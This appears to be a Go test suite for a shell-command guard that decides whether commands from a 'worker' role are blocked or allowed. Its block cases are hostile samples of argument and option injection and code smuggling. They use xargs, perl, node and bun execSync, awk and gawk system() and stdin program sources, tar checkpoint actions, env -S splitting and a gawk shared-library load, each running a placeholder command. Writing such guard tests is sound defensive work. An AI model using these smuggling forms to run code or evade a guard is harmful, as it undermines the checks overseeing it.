		{"P-R4-MF2-b-pipe perl -pe glued", `echo '-eBEGIN{system("pig")}' | xargs -I{} perl -pe 's/a/b/' {}`},
		{"P-R4-MF2-c-pipe custom FOO", `echo '-esystem("pig")' | xargs -IFOO perl -e '1' FOO`},
		{"P-R4-MF2-d-pipe ruby glued", `echo '-esystem("pig")' | xargs -I{} ruby -e '1' {}`},
		{"P-R4-MF2-e-pipe node --eval=", `echo '--eval=require("child_process").execSync("pig")' | xargs -I{} node -e '1' {}`},
		{"P-R4-MF2-f-pipe bun --eval=", `echo '--eval=require("child_process").execSync("pig")' | xargs -I{} bun -e '1' {}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
		})
	}

	// R4-MF-4 awk stdin 程序源:echo 管道 + guardCtxRunArgv argv+stdin 双通道
	// 均须拦截(Reviewer R3 #3 argv+stdin 独立性)。
	for _, tc := range []struct {
		name, cmd, want string
	}{
		{"P-R4-MF4-a -W file=-", `echo 'BEGIN{system("pig")}' | gawk -W file=-`, "awk script from stdin"},
		{"P-R4-MF4-b -W file=/dev/stdin", `echo 'BEGIN{system("pig")}' | gawk -W file=/dev/stdin`, "awk script from stdin"},
		{"P-R4-MF4-h gawk -E stdin", `echo 'BEGIN{system("pig")}' | gawk -E /dev/stdin`, "awk script from stdin"},
		{"P-R4-MF4-i --exec=stdin", `echo 'BEGIN{system("pig")}' | gawk --exec=/dev/stdin`, "awk script from stdin"},
		{"P-R4-MF4-j --exec stdin sep", `echo 'BEGIN{system("pig")}' | gawk --exec /dev/stdin`, "awk script from stdin"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}
	for _, tc := range []struct {
		name string
		argv []string
		want string
	}{
		{"P-R4-MF4-a-argvstdin", []string{"gawk", "-W", "file=-"}, "awk script from stdin"},
		{"P-R4-MF4-b-argvstdin", []string{"gawk", "-W", "file=/dev/stdin"}, "awk script from stdin"},
		{"P-R4-MF4-h-argvstdin", []string{"gawk", "-E", "/dev/stdin"}, "awk script from stdin"},
		{"P-R4-MF4-i-argvstdin", []string{"gawk", "--exec=/dev/stdin"}, "awk script from stdin"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{
				id: tc.name, role: "worker",
				argv:  tc.argv,
				stdin: "BEGIN{system(\"pig\")}",
			}, "")
			if !strings.Contains(got, tc.want) {
				t.Fatalf("guardCtxRunArgv %v + stdin = %q, want verdict substring %q", tc.argv, got, tc.want)
			}
		})
	}
	t.Run("P-R4-MF4-k -W file heredoc", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "P-R4-MF4-k", role: "worker", cmd: "gawk -W file=- <<'EOF'\nBEGIN{system(\"pig\")}\nEOF"}, "")
		if !strings.Contains(got, "awk script from stdin") {
			t.Fatalf("gawk -W file=- heredoc = %q, want awk script from stdin", got)
		}
	})

	// 放行守卫正例(R4 零假阳纪律):find 自身 {}、xargs -- 分隔/./{} 前缀、
	// awk/git 合法数据、script 以值字母结尾的位置文件名不再吞 --。
	allowCases := []struct {
		name, cmd string
	}{
		{"R4-pos find perl -pe", `find . -exec perl -pe 's/a/b/' {} \;`},
		{"R4-pos find perl trailing", `find . -exec perl -pe 's/a/b/' {} other.txt \;`},
		{"R4-pos xargs perl -- token", `echo a.txt | xargs -I{} perl -pe 's/a/b/' -- {}`},
		{"R4-pos xargs perl dot-slash", `echo a.txt | xargs -I{} perl -pe 's/a/b/' ./{}`},
		{"R4-pos find awk -f -v", `find . -exec awk -f parse.awk -v fname={} {} \;`},
		{"R4-pos find git --git-dir", `find . -name .git -exec git --git-dir={} log -1 \;`},
		{"R4-pos find rg env -S", `find . -name '*.go' -exec rg env -S {} \;`},
		{"R4-pos git -c user.name", `xargs -a ` + payloadEvilAwk + ` -I{} git -cuser.name={} log`},
		{"R4-pos git -C glued", `find . -exec git -C{} status \;`},
		{"R4-pos awk glued -vf", `xargs -a ` + payloadEvilAwk + ` -I{} awk -vf={} 'END{print f}' /dev/null`},
		{"R4-pos awk glued -F", `xargs -a ` + payloadEvilAwk + ` -I{} awk -F{} 'END{print f}' /dev/null`},
		{"R4-pos awk --assign glued", `xargs -a ` + payloadEvilAwk + ` -I{} awk --assign=f={} 'END{print f}' /dev/null`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}

	// R4-SF-3: script 以值字母结尾的位置文件名不再吞掉 --(xargs -a 无管道
	// 入口,避免上游 piped code verdict 掩盖)。
	t.Run("R4-pos script positional .o", func(t *testing.T) {
		payloadX := mkPayload("r4-x", "x\n")
		got := rtGuardCwd(t, rtCase{id: "R4-pos-script-o", role: "worker", cmd: `xargs -a ` + payloadX + ` -I% script /tmp/out.o -- %`}, "")
		if got != "ALLOW" {
			t.Fatalf("xargs script /tmp/out.o -- %% = %q, want ALLOW", got)
		}
	})

	// 目标层直断断言:R4 修复点的单元 verdict 不依赖外层规则兜出 BLOCK。
	t.Run("R4-unit env-split re-split chain", func(t *testing.T) {
		for _, tc := range []struct {
			name string
			argv []string
			want bool
		}{
			{"env -Senv -S", []string{"env", "-Senv -S", "find . -name {}"}, true},
			{"env -S nice nice env -S", []string{"env", "-S", "nice nice env -S", "find . -name {}"}, true},
			{"env -S nice nice nice env -S", []string{"env", "-S", "nice nice nice", "env", "-S", "find . -name {}"}, true},
		} {
			if got := wrapperChainEnvSplitHasToken(tc.argv, os.Getenv("PATH"), callerIdentity{}, "{}"); got != tc.want {
				t.Errorf("wrapperChainEnvSplitHasToken(%v) = %v, want %v", tc.argv, got, tc.want)
			}
		}
	})
	t.Run("R4-unit awk -W shapes direct", func(t *testing.T) {
		if _, _, hit := awkProgramFrags([]string{"-W", "file=-"}); hit != "awk script from stdin" {
			t.Errorf("awkProgramFrags(-W file=-) hit = %q, want awk script from stdin", hit)
		}
		if _, _, hit := awkProgramFrags([]string{"-W", "file=/dev/stdin"}); hit != "awk script from stdin" {
			t.Errorf("awkProgramFrags(-W file=/dev/stdin) hit = %q, want awk script from stdin", hit)
		}
		if _, _, hit := awkProgramFrags([]string{"-Wfile=-"}); hit != "awk script from stdin" {
			t.Errorf("awkProgramFrags(-Wfile=-) hit = %q, want awk script from stdin", hit)
		}
		if _, _, hit := awkProgramFrags([]string{"-E", "/dev/stdin"}); hit != "awk script from stdin" {
			t.Errorf("awkProgramFrags(-E /dev/stdin) hit = %q, want awk script from stdin", hit)
		}
		if _, _, hit := awkProgramFrags([]string{"--exec=/dev/stdin"}); hit != "awk script from stdin" {
			t.Errorf("awkProgramFrags(--exec=/dev/stdin) hit = %q, want awk script from stdin", hit)
		}
		prog, _, hit := awkProgramFrags([]string{"-e", "1", "-W", "source", "BEGIN{1}", "/dev/null"})
		if hit != "" || !strings.Contains(prog, "BEGIN{1}") {
			t.Errorf("awkProgramFrags(-W source PROG) = %q hit %q, want program containing BEGIN{1}", prog, hit)
		}
		prog2, _, hit2 := awkProgramFrags([]string{"-e", "1", "-W", "so=BEGIN{2}", "/dev/null"})
		if hit2 != "" || !strings.Contains(prog2, "BEGIN{2}") {
			t.Errorf("awkProgramFrags(-W so=PROG) = %q hit %q, want program containing BEGIN{2}", prog2, hit2)
		}
	})
	t.Run("R4-unit awkOptZone positional scan", func(t *testing.T) {
		if !awkOptZoneHasToken([]string{"-e", "1", "/dev/null", "-f", "{}"}, "{}", false) {
			t.Errorf("awkOptZoneHasToken(positional then -f {}) = false, want true")
		}
		if !awkOptZoneHasToken([]string{"-e", "1", "/dev/null", "--file={}"}, "{}", false) {
			t.Errorf("awkOptZoneHasToken(positional then --file={}) = false, want true")
		}
		if awkOptZoneHasToken([]string{"-vf={}", "/dev/null"}, "{}", false) {
			t.Errorf("awkOptZoneHasToken(-vf={}) = true, want false (glued data assignment)")
		}
	})
	t.Run("R4-unit scriptOptWord positional", func(t *testing.T) {
		if consume, hit := scriptOptWordTokenStep([]string{"script", "/tmp/out.o", "--", "%"}, 1, "%"); consume != 0 || hit {
			t.Errorf("scriptOptWordTokenStep(positional /tmp/out.o) = %d,%v want 0,false", consume, hit)
		}
	})
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R5 (R7 闭环): R5-MF-1..4 / R5-SF-1..3 探针回归 —
// flagCodes+valShort 双槽消费恢复 sh -co/bash -co/node -pr/bun -pc 的 BLOCK;
// env -S 同层递归拆出内层 -S 载荷沿 token 传播闭合;awk 选项区裸 token
// 按 findPathToken 语义命中;gawk GNU 唯一前缀与 -W assign/--as 操作数消费
// 闭合。所有 dynamic code payload 精确断言走 xargs -a 无管道入口,stdin
// 程序源断言走 echo 管道与 argv+stdin 双通道(R3-Obs-2 隔离纪律)。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR5Probes(t *testing.T) {
	mkPayload := func(name, content string) string {
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		return p
	}
	payloadEval := mkPayload("r5-eval", "--eval=require(\"child_process\").execSync(\"pig\")\n")
	payloadFooExec := mkPayload("r5-fooexec", "foo -exec pig ;\n")
	payloadCkpt := mkPayload("r5-ckpt", "a --checkpoint=1 --checkpoint-action=exec=pig\n")
	payloadEBegin := mkPayload("r5-ebegin", "-eBEGIN{system(\"pig\")}\n")
	payloadFstdin := mkPayload("r5-fstdin", "-f/dev/stdin\n")
	payloadEvilSo := mkPayload("r5-evilso", "/tmp/evil.so\n")

	blockCases := []struct {
		name, cmd, want string
	}{
		// R5-MF-1: R6 回归修复 — flagCodes+valShort 集群的值槽先查动态词,
		// 待定代码槽再消费一个操作数(sh/bash/node/bun 全部恢复 BLOCK)。
		{"P-R5-MF1-a sh -co", `X='errexit pig'; sh -co $X 'echo hi'`, "dynamic code payload"},
		{"P-R5-MF1-b bash -co", `X='errexit pig'; bash -co $X 'echo hi'`, "dynamic code payload"},
		{"P-R5-MF1-c node -pr", `X='a.js -e require("child_process").execSync("pig")'; node -pr $X '1'`, "dynamic code payload"},
		{"P-R5-MF1-d bun -pc", `X='a.toml -e require("child_process").execSync("pig")'; bun -pc $X '1'`, "dynamic code payload"},
		{"P-R5-MF1-e node -pC separate", `X='a.js -e require("child_process").execSync("pig")'; node -pC default '1' -r $X`, "dynamic code payload"},
		{"P-R5-MF1-f node -pC glued", `X='a.js -e require("child_process").execSync("pig")'; node -pCdefault '1' -r $X`, "dynamic code payload"},
		{"P-R5-MF1-g xargs node -pC", `xargs -a ` + payloadEval + ` -I% node -pC default '1' %`, "dynamic code payload"},
		{"P-R5-MF1-h xargs node -pC glued", `xargs -a ` + payloadEval + ` -I% node -pCdefault '1' %`, "dynamic code payload"},
		// R5-MF-2: env -S 同层递归拆出内层 -S 载荷沿 token 传播。
		{"P-R5-MF2-a env -S -S find", `xargs -a ` + payloadFooExec + ` -I{} env -S "-S" "find . -name {}"`, "dynamic code payload"},
		{"P-R5-MF2-b env -S-S find", `xargs -a ` + payloadFooExec + ` -I{} env "-S-S" "find . -name {}"`, "dynamic code payload"},
		{"P-R5-MF2-c env -S split-string", `xargs -a ` + payloadFooExec + ` -I{} env -S "--split-string" "find . -name {}"`, "dynamic code payload"},
		{"P-R5-MF2-d env -S -i -S tar", `xargs -a ` + payloadCkpt + ` -I{} env -S "-i -S" "tar -cf /dev/null {}"`, "dynamic code payload"},
		// R5-MF-3: awk 选项区裸 token 按 findPathToken 语义命中(单词粘连
		// 选项注入 — mawk/gawk 均可触发)。
		{"P-R5-MF3-a gawk -e glued", `xargs -a ` + payloadEBegin + ` -I{} gawk -e '1' {}`, "dynamic code payload"},
		{"P-R5-MF3-b gawk -e /dev/null", `xargs -a ` + payloadEBegin + ` -I{} gawk -e '1' /dev/null {}`, "dynamic code payload"},
		{"P-R5-MF3-c awk -f devstdin", `xargs -a ` + payloadFstdin + ` -I{} awk -f /dev/null {}`, "dynamic code payload"},
		// R5-MF-4: gawk GNU 唯一前缀 / -i 库验证 / -W assign 操作数消费。
		{"P-R5-MF4-f -W assign program", `gawk -W assign 'x=1' 'BEGIN{system("pig")}'`, "pig"},
		{"P-R5-MF4-f2 -W field-separator", `gawk -W field-separator : 'BEGIN{system("pig")}'`, "pig"},
		{"P-R5-MF4-g --as program", `gawk --as 'x=1' 'BEGIN{system("pig")}'`, "pig"},
		{"P-R5-MF4-g2 --fie program", `gawk --fie : 'BEGIN{system("pig")}'`, "pig"},
		{"P-R5-MF4-h -l load xargs", `xargs -a ` + payloadEvilSo + ` -I{} gawk -e '1' -l '{}'`, "dynamic code payload"},
		{"P-R5-MF4-h2 -W lo xargs", `xargs -a ` + payloadEvilSo + ` -I{} gawk -e '1' -W lo '{}'`, "dynamic code payload"},
		{"P-R5-MF4-h3 -W e xargs", `xargs -a ` + payloadEvilSo + ` -I{} gawk -e '1' -W e '{}'`, "dynamic code payload"},
		{"P-R5-MF4-x1 --as xargs", `xargs -a ` + mkPayload("r5-begin2", "BEGIN{system(\"pig\")}\n") + ` -I{} gawk --as 'x=1' '{}'`, "dynamic code payload"},
		// R4-Obs-1: script 追加模式回归用例(补 R4 缺口)。
		{"P-R4-Obs1 script append", `xargs -a ` + mkPayload("r5-cflag", "-c pig\n") + ` script /dev/null`, "dynamic code payload"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// R5-MF-4 stdin 程序源管道:--include/-i/--e/-W e 各形态均须命中
	// awk script from stdin(echo 管道 + argv+stdin 双通道)。
	for _, tc := range []struct {
		name, cmd, want string
	}{
		{"P-R5-MF4-a --include=stdin pipe", `echo 'BEGIN{system("pig")}' | gawk --include=/dev/stdin '1'`, "awk script from stdin"},
		{"P-R5-MF4-a2 --include sep pipe", `echo 'BEGIN{system("pig")}' | gawk --include /dev/stdin '1'`, "awk script from stdin"},
		{"P-R5-MF4-b -i stdin pipe", `echo 'BEGIN{system("pig")}' | gawk -i /dev/stdin '1'`, "awk script from stdin"},
		{"P-R5-MF4-b2 -i glued pipe", `echo 'BEGIN{system("pig")}' | gawk -i/dev/stdin '1'`, "awk script from stdin"},
		{"P-R5-MF4-d --e=stdin pipe", `echo 'BEGIN{system("pig")}' | gawk --e=/dev/stdin`, "awk script from stdin"},
		{"P-R5-MF4-d2 --e sep pipe", `echo 'BEGIN{system("pig")}' | gawk --e /dev/stdin`, "awk script from stdin"},
		{"P-R5-MF4-e -W e=stdin pipe", `echo 'BEGIN{system("pig")}' | gawk -W e=/dev/stdin`, "awk script from stdin"},
		{"P-R5-MF4-e2 -W e sep pipe", `echo 'BEGIN{system("pig")}' | gawk -W e /dev/stdin`, "awk script from stdin"},
		{"P-R5-MF4-e3 -W in=stdin pipe", `echo 'BEGIN{system("pig")}' | gawk -W in=/dev/stdin '1'`, "awk script from stdin"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}
	for _, tc := range []struct {
		name string
		argv []string
		want string
	}{
		{"P-R5-MF4-c argvstdin --include=", []string{"gawk", "--include=/dev/stdin", "1"}, "awk script from stdin"},
		{"P-R5-MF4-c2 argvstdin -i sep", []string{"gawk", "-i", "/dev/stdin", "1"}, "awk script from stdin"},
		{"P-R5-MF4-c3 argvstdin --e=", []string{"gawk", "--e=/dev/stdin"}, "awk script from stdin"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{
				id: tc.name, role: "worker",
				argv:  tc.argv,
				stdin: "BEGIN{system(\"pig\")}",
			}, "")
			if !strings.Contains(got, tc.want) {
				t.Fatalf("guardCtxRunArgv %v + stdin = %q, want verdict substring %q", tc.argv, got, tc.want)
			}
		})
	}

	// 放行守卫正例(R5 零假阳纪律):find 自身 {}、xargs --/./{} 拼写、
	// awk -v 纯数据、静态 sh -co、-- 后的 awk argv 数据。
	allowCases := []struct {
		name, cmd string
	}{
		{"R5-pos find perl -pe", `find . -exec perl -pe 's/a/b/' {} \;`},
		{"R5-pos find perl trailing", `find . -exec perl -pe 's/a/b/' {} other.txt \;`},
		{"R5-pos xargs perl -- token", `echo a.txt | xargs -I{} perl -pe 's/a/b/' -- {}`},
		{"R5-pos xargs perl dot-slash", `echo a.txt | xargs -I{} perl -pe 's/a/b/' ./{}`},
		{"R5-pos find awk -f -v", `find . -exec awk -f parse.awk -v fname={} {} \;`},
		{"R5-pos find awk -v data", `find . -exec awk -v f={} 'END {print f}' {} \;`},
		{"R5-pos xargs awk -vf glued", `echo x | xargs -I{} awk -vf={} 'END{print f}' /dev/null`},
		{"R5-pos xargs awk -- token", `echo x | xargs -I{} awk -f parse.awk -- {}`},
		{"R5-pos xargs awk dot-slash", `echo x | xargs -I{} awk -f parse.awk ./{}`},
		{"R5-pos sh -co static", `sh -co errexit 'echo hi'`},
		{"R5-pos gawk -- data", `gawk 'BEGIN{print ARGV[1]}' -- -f -`},
		{"R5-pos find rg env -S", `find . -name '*.go' -exec rg env -S {} \;`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}

	// 目标层直断断言(R5-Obs 防掩盖纪律):skipEnvOperandsToken /
	// awkOptZoneHasToken findPathToken / awkWOperandProgram 的单元 verdict
	// 不依赖外层管道或外围规则兜出 BLOCK。
	t.Run("R5-unit env re-split token propagation", func(t *testing.T) {
		for _, tc := range []struct {
			name string
			argv []string
			want bool
		}{
			{"env -S -S", []string{"env", "-S", "-S", "find . -name {}"}, true},
			{"env -S-S", []string{"env", "-S-S", "find . -name {}"}, true},
			{"env -S -i -S", []string{"env", "-S", "-i -S", "find . -name {}"}, true},
			{"env -S benign", []string{"env", "-S", "echo hi"}, false},
			{"rg env -S operand", []string{"rg", "env", "-S", "{}"}, false},
		} {
			if got := wrapperChainEnvSplitHasToken(tc.argv, os.Getenv("PATH"), callerIdentity{}, "{}"); got != tc.want {
				t.Errorf("wrapperChainEnvSplitHasToken(%v) = %v, want %v", tc.argv, got, tc.want)
			}
		}
	})
	t.Run("R5-unit awkOptZone bare token find-vs-xargs", func(t *testing.T) {
		if !awkOptZoneHasToken([]string{"-e", "1", "{}"}, "{}", false) {
			t.Errorf("awkOptZoneHasToken xargs bare token = false, want true")
		}
		if awkOptZoneHasToken([]string{"-e", "1", "{}"}, "{}", true) {
			t.Errorf("awkOptZoneHasToken find own {} = true, want false")
		}
		if awkOptZoneHasToken([]string{"-e", "1", "./{}"}, "{}", false) {
			t.Errorf("awkOptZoneHasToken ./{} = true, want false")
		}
		if awkOptZoneHasToken([]string{"-e", "1", "--", "{}"}, "{}", false) {
			t.Errorf("awkOptZoneHasToken -- {} = true, want false (post-terminator data)")
		}
	})
	t.Run("R5-unit awk -W assign consumption", func(t *testing.T) {
		prog, _, hit := awkProgramFrags([]string{"-W", "assign", "x=1", "BEGIN{1}"})
		if hit != "" || !strings.Contains(prog, "BEGIN{1}") {
			t.Errorf("awkProgramFrags(-W assign x=1 PROG) = %q hit %q, want program BEGIN{1}", prog, hit)
		}
		prog2, _, hit2 := awkProgramFrags([]string{"--as", "x=1", "BEGIN{2}"})
		if hit2 != "" || !strings.Contains(prog2, "BEGIN{2}") {
			t.Errorf("awkProgramFrags(--as x=1 PROG) = %q hit %q, want program BEGIN{2}", prog2, hit2)
		}
		if _, _, hit3 := awkProgramFrags([]string{"--include=/dev/stdin", "1"}); hit3 != "awk script from stdin" {
			t.Errorf("awkProgramFrags(--include=/dev/stdin) hit = %q, want awk script from stdin", hit3)
		}
		if _, _, hit4 := awkProgramFrags([]string{"-i", "/dev/stdin", "1"}); hit4 != "awk script from stdin" {
			t.Errorf("awkProgramFrags(-i /dev/stdin) hit = %q, want awk script from stdin", hit4)
		}
		if _, _, hit5 := awkProgramFrags([]string{"--e=/dev/stdin"}); hit5 != "awk script from stdin" {
			t.Errorf("awkProgramFrags(--e=/dev/stdin) hit = %q, want awk script from stdin", hit5)
		}
		if _, _, hit6 := awkProgramFrags([]string{"-l", "/dev/stdin"}); hit6 != "awk script from stdin" {
			t.Errorf("awkProgramFrags(-l /dev/stdin) hit = %q, want awk script from stdin", hit6)
		}
	})
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R6 (R8 终局收口): R6-MF-1..4 / R6-SF-1..2 探针回归 —
// POSIX shell pending -c 全链路对齐(sh -co errexit -o $X / sh -co errexit --
// /xargs -a sh -c -- 回归与逃逸闭合);awkClusterWOperand -W include/-W load
// 不再错置 sawFile;awkWOperandTokenStep/awkWOperandProgram 覆盖 -W '{}' /
// -W "$X" 选项名盲区与 awkProgramTokenHit 空程序门控;gawk 可选参数短选项
// d/D/L/o/p 粘连尾串立即结束集群;awk -- "$VAR" 与 clusterConsumesOperand
// 非纯字母尾 hasFlagCode 锁步对齐。所有 dynamic code payload 精确断言走
// xargs -a 无管道入口(R3-Obs-2 隔离纪律)。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR6Probes(t *testing.T) {
	mkPayload := func(name, content string) string {
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		return p
	}
	payloadPig := mkPayload("r6-pig", "pig\n")
	payloadExec := mkPayload("r6-exec", "exec\n")
	payloadSource := mkPayload("r6-source", "source=BEGIN{system(\"pig\")}\n")
	payloadEBegin := mkPayload("r6-ebegin", "-eBEGIN{system(\"pig\")}\n")
	payloadEvilSo := mkPayload("r6-evilso", "/tmp/evil.so\n")
	payloadDevStdin := mkPayload("r6-devstdin", "/dev/stdin\n")
	payloadX := mkPayload("r6-x", "x\n")

	blockCases := []struct {
		name, cmd, want string
	}{
		// R6-MF-1: POSIX shell pending -c 全链路对齐 — R7 回归(sh/bash -co
		// errexit -o $X 从 3ddc0a7 BLOCK 退化)与 -o/-- 逃逸全部恢复 BLOCK。
		{"P-R6-MF1-a sh -co -o X", `X='errexit pig'; sh -co errexit -o $X 'echo hi'`, "dynamic code payload"},
		{"P-R6-MF1-b bash -co -o X", `X='errexit pig'; bash -co errexit -o $X 'echo hi'`, "dynamic code payload"},
		{"P-R6-MF1-c bash -co -o pipefail", `bash -co errexit -o pipefail 'pig'`, "pig"},
		{"P-R6-MF1-d sh -co -- pig", `sh -co errexit -- 'pig'`, "pig"},
		{"P-R6-MF1-e sh -ce -o X", `X='errexit pig'; sh -ce -o $X 'echo hi'`, "dynamic code payload"},
		{"P-R6-MF1-f xargs -I% sh -co -- %", `xargs -a ` + payloadPig + ` -I% sh -co errexit -- %`, "dynamic code payload"},
		{"P-R6-MF1-g xargs sh -c --", `xargs -a ` + payloadPig + ` sh -c --`, "dynamic code payload"},
		// R6-MF-2: -W include/-W load 不再错置 sawFile,位置主程序正常提取。
		{"P-R6-MF2-a -W include=", `gawk -W include=/dev/null 'BEGIN{system("pig")}'`, "pig"},
		{"P-R6-MF2-b -W include sep", `gawk -W include /dev/null 'BEGIN{system("pig")}'`, "pig"},
		{"P-R6-MF2-c -W i=", `gawk -W i=/dev/null 'BEGIN{system("pig")}'`, "pig"},
		{"P-R6-MF2-d -W load=time", `gawk -W load=time 'BEGIN{system("pig")}'`, "pig"},
		// R6-MF-3: -W '{}' / -W "$X" 选项名盲区与 awkProgramTokenHit 空程序
		// 门控跳过全部闭合。
		{"P-R6-MF3-a xargs awk -W '{}' /dev/stdin", `xargs -a ` + payloadExec + ` -I{} awk -W '{}' /dev/stdin`, "dynamic code payload"},
		{"P-R6-MF3-b xargs gawk -W '{}' '1'", `xargs -a ` + payloadSource + ` -I{} gawk -W '{}' '1'`, "dynamic code payload"},
		{"P-R6-MF3-c awk -W X /dev/stdin", `X='exec'; echo 'BEGIN{system("pig")}' | awk -W "$X" /dev/stdin`, "dynamic code payload"},
		{"P-R6-MF3-d gawk -W X 1", `X='source=BEGIN{system("pig")}'; gawk -W "$X" '1'`, "dynamic code payload"},
		{"P-R6-MF3-e gawk -e '' {}", `xargs -a ` + payloadEBegin + ` -I{} gawk -e '' {}`, "dynamic code payload"},
		{"P-R6-MF3-f gawk -e '' -l '{}'", `xargs -a ` + payloadEvilSo + ` -I{} gawk -e '' -l '{}'`, "dynamic code payload"},
		{"P-R6-MF3-g gawk -e '' -i '{}'", `xargs -a ` + payloadDevStdin + ` -I{} gawk -e '' -i '{}'`, "dynamic code payload"},
		// R6-MF-4: gawk 可选参数短选项 d/D/L/o/p 粘连尾串立即结束集群。
		{"P-R6-MF4-a -Lfatal", `gawk -Lfatal 'BEGIN{system("pig")}'`, "pig"},
		{"P-R6-MF4-b -Lno-ext", `gawk -Lno-ext 'BEGIN{system("pig")}'`, "pig"},
		{"P-R6-MF4-c -p/dev/null", `gawk -p/dev/null 'BEGIN{system("pig")}'`, "pig"},
		{"P-R6-MF4-d -d/tmp/v xargs", `xargs -a ` + payloadEBegin + ` -I{} gawk -d/tmp/v {} '1'`, "dynamic code payload"},
		// R6-SF-1: awk -- "$VAR" 在本机 mawk/gawk 直通 — !endOpts 改 !sawFile。
		{"P-R6-SF1-a awk -- VAR", `VAR='BEGIN{system("pig")}'; awk -- "$VAR"`, "dynamic code payload"},
		// R6-SF-2: clusterConsumesOperand 非纯字母尾保留 hasFlagCode。
		{"P-R6-SF2-a node -pCfoo-bar", `X='a.js -e require("child_process").execSync("pig")'; node -pCfoo-bar '1' -r $X`, "dynamic code payload"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// 放行守卫正例(R6 零假阳纪律):合法 $0/$1 数据槽、-W assign 纯数据、
	// awk -- 后文件名、gawk -Lfatal 合法 lint 值。
	allowCases := []struct {
		name, cmd string
	}{
		{"R6-pos sh -co errexit echo", `sh -co errexit 'echo hi'`},
		{"R6-pos sh -co errexit $1", `sh -co errexit 'echo "$1"' _ "$ARG"`},
		{"R6-pos xargs sh -c $1", `xargs -a ` + payloadX + ` -I{} sh -c 'echo "$1"' _ {}`},
		{"R6-pos gawk -W assign", `gawk -W assign 'x=1' 'BEGIN{print x}'`},
		{"R6-pos xargs -W assign {}", `xargs -a ` + payloadX + ` -I{} gawk -W assign '{}' '1' /dev/null`},
		{"R6-pos xargs -W assign=x={}", `xargs -a ` + payloadX + ` -I{} gawk -W 'assign=x={}' '1' /dev/null`},
		{"R6-pos awk -f -- $FILE", `awk -f parse.awk -- "$FILE"`},
		{"R6-pos awk '1' -- $FILE", `awk '1' -- "$FILE"`},
		{"R6-pos gawk -Lfatal lint", `gawk -Lfatal 'BEGIN{print 1}'`},
		{"R6-pos gawk -- data", `gawk 'BEGIN{print ARGV[1]}' -- -f -`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R7 (R9 终局收口): R7-MF-1..4 / R7-SF-1 探针回归 —
// awkProgramFrags 恢复 !endOpts 动态词门控(awk -f /dev/null "$X" / gawk '1'
// "$X" 系列 R8 安全回归);unwrapShellWordStep 的 isCluster 通道杜绝单字
// --long-opt 落入短选项集群(bash --restricted 四路 stdin 回归);裸 -c 布
// 尔语义与 POSIX 单横杠 "-"/"+" 终止符结算(sh -c -o ... -o $X / sh -c -
// 'pig' / xargs -a sh -c -);mawk -W 语法冲突(-Wi/-W i/-W in 布尔吞程序
// 与逗号串联 -W interactive,exec);awk 纯数据赋值槽无引号词拆分拦截
// (-v/-F/--assign/-W assign)。所有探针仅依赖基线共有入口 rtGuardCwd
// 与 guardCtxRunStdin(argv 通道)。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR7Probes(t *testing.T) {
	mkPayload := func(name, content string) string {
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		return p
	}
	payloadPig := mkPayload("r7-pig", "pig\n")
	payloadX := mkPayload("r7-x", "x\n")

